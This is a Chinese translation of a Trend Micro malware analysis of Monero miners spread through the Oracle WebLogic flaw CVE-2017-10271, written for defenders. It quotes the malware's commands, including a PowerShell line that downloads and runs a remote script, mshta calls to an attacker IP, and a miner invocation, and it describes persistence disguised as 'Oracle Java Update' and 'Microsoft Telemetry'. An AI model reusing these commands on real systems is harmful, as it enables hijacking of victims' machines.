> 原文链接: https://www.anquanke.com//post/id/99441 


# 恶意软件分析：利用Oracle服务器远程执行漏洞进行门罗币挖矿


                                阅读量   
                                **123582**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者trend micro，文章来源：blog.trendmicro.com
                                <br>原文地址：[https://blog.trendmicro.com/trendlabs-security-intelligence/oracle-server-vulnerability-exploited-deliver-double-monero-miner-payloads/](https://blog.trendmicro.com/trendlabs-security-intelligence/oracle-server-vulnerability-exploited-deliver-double-monero-miner-payloads/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t0168d54311f9f1fb5e.jpg)](https://p4.ssl.qhimg.com/t0168d54311f9f1fb5e.jpg)



## 简介

随着加密货币的不断发展，黑客们所针对的目标也发生了转变。目前，网络犯罪分子开始调整策略，使用他们的资源来尝试获取加密货币，包括窃取加密货币钱包和攻陷网络设备使其挖掘加密货币。多年来，勒索软件的作者一直在使用比特币作为他们的首选货币。但最近，我们从2017年10月开始，监测到加密货币挖矿恶意软件的爆发，在应用商店中还发现用于加密货币挖矿的移动恶意应用。2017年12月，Digmine加密货币挖矿恶意软件开始通过社交软件进行传播。<br>
而现在，有两个恶意软件利用了CVE-2017-10271（一种允许远程执行代码的Oracle WebLogic WLS-WSAT漏洞， [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-10271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-10271) ），它们分别是XMRig Menero挖矿恶意软件的64位变体和32位变体。假如某一版本与被感染的Windows计算机不兼容，则会自动运行另一个版本。在下图中，说明了该漏洞的代码仍在开发中。本报告分析了最新版本的样本。

[![](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/Coinminer1.png)](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/Coinminer1.png)



## 利用漏洞投放双重矿工有效载荷

在撰写本文时，我们发现已经存在CVE-2017-10271的EXP，并且该漏洞被用于承载名为Coinminer_MALXMR.JL-PS的有效载荷（ [https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/coinminer_malxmr.jl-ps](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/coinminer_malxmr.jl-ps) ）。当该有效载荷成功执行时，就可以在被感染的主机上运行双重门罗币矿工。

[![](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/Coinminer2.png)](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/Coinminer2.png)<br>
在执行Coinminer_MALXMR.JL-PS之后，会将三个文件下载到主机上：挖掘组件javaupd.exe（被检测为Coinminer_TOOLXMR.JL-WIN64）、自动启动组件startup.cmd（被检测为Coinminer_MALXMR.JL-BAT）以及另一个恶意文件3.exe（被检测为Coinminer_MALXMR.JLT-WIN32）。<br>
根据我们对最新有效载荷的分析，我们发现该恶意软件会根据操作系统的架构来选择运行加密货币矿工。如果是64位版本的系统，就会运行第一个矿工程序；如果是32位系统，那就会运行第二个矿工程序。



## 更多设备会受到多个矿工版本的影响

由于感染过程会首先在主机上安装自动启动组件。以我们所分析的样本为例，恶意软件通过将startup.cmd复制到Startup文件夹来完成这一操作。.cmd文件会在系统启动时打开，然后执行mshta hxxp://107.181.174.248/web/p.hta 。<br>
随后，将会执行PowerShell命令：

```
cmd /c powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString(‘hxxp://107.181.174.248/web/check.ps1’))
```

恶意软件会创建两个不同的计划任务：<br>
第一项任务不断尝试下载矿工程序，并且反复执行。该任务将会执行mshta hxxp://107.181.174.248/web/p.hta，其名称为“Oracle Java Update”。该任务每80分钟执行一次，其进程与startup.cmd文件相同。<br>
另一个计划任务名称为“Oracle Java”，该任务每天执行，会终止最开始的挖掘组件，并继续执行以下命令：

```
cmd /c taskkill /im powershell.exe /f
cmd /c taskkill /im javaupd.exe /f
cmd /c taskkill /im msta.exe /f （我们怀疑开发人员在这里出现了错误，推测应该是mshta.exe）
```

在创建这些计划任务之后，Coinminer_MALXMR.JL-PS将会执行其加密货币挖掘组件javaupd.exe，从而允许挖掘过程开始。它使用如下命令：

```
cmd.exe /c C:ProgramDatajavaupd.exe -o eu.minerpool.pw:65333 -u `{`Computer Name`}`
```

挖矿过程可能会减慢系统运行速度，并影响性能。<br>
第二个有效载荷，即下载的3.exe文件会检查系统所运行的架构是32位还是64位。基于操作系统的架构，它会下载并执行一个新文件LogonUI.exe（检测为COINMINER_MALXMR.JL-WIN32）。如果第一个64位的加密货币挖掘组件未运行，LogonUI将下载一个.DLL文件（检测为COINMINER_MALXMR.FD-WIN32），随后将下载并执行第二个加密货币挖掘组件sqlservr.exe（检测为COINMINER_TOOLXMR.JL-WIN32）。<br>
第二个组件能与32位Windows兼容，并将运行在32位系统上。此外，它还能够随每次开机自动启动并创建一个计划任务，使它能够每天自动执行：
1. LogonUI已注册为服务；
1. 该服务被命名为“Microsoft Telemetry”；
1. 创建每天执行“Microsoft Telemetry”的计划任务。
[![](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/Coinminer3.jpg)](https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/02/Coinminer3.jpg)<br>
该加密货币挖掘恶意软件会尽可能多地感染设备，由于它需要大量的计算能力，这样才能尽可能多地挖掘到加密货币。借助于这两个有效载荷，这两个系统每天都能够自动启动，从而使得恶意软件能长期、持久地感染主机。<br>
该恶意程序也会通过关闭其它软件的方式，以充分利用自己所感染的机器。实际上，它会种植spoosvc.exe，并删除计划任务“Spooler SubSystem Service”，这是另一个被命名为TROJ_DLOADR.AUSUHI的加密货币矿工软件的已知行为。



## 对用户产生的影响及相应对策

该恶意软件耗费系统的大量CPU和GPU资源，使系统运行得异常缓慢。起初，考虑到其他的影响因素，用户可能不会意识到有威胁的存在。但是，正如我们在上文所提到的，考虑到自2017年以来加密货币挖矿攻击的现象一直在增加，因此用户可能遭受更多恶意软件变种的威胁。网络犯罪分子正在努力尝试以全新的方式来向用户提供挖掘软件。<br>
定期修复和及时对软件进行更新，可以缓解加密货币恶意软件的威胁，并降低系统漏洞被利用的潜在风险。上述漏洞已于2017年10月进行了修复。IT/系统管理员和信息安全专业人士可以考虑加入应用程序白名单或类似的安全机制，以防止可疑的可执行文件被运行或安装。最后，主动监测网络流量将有助于更好地识别恶意软件的特征。



## IoC

[![](https://p4.ssl.qhimg.com/t01be0e86197fc82e1a.png)](https://p4.ssl.qhimg.com/t01be0e86197fc82e1a.png)<br>[![](https://p1.ssl.qhimg.com/t01bb7f7a4fb2a392d5.png)](https://p1.ssl.qhimg.com/t01bb7f7a4fb2a392d5.png)
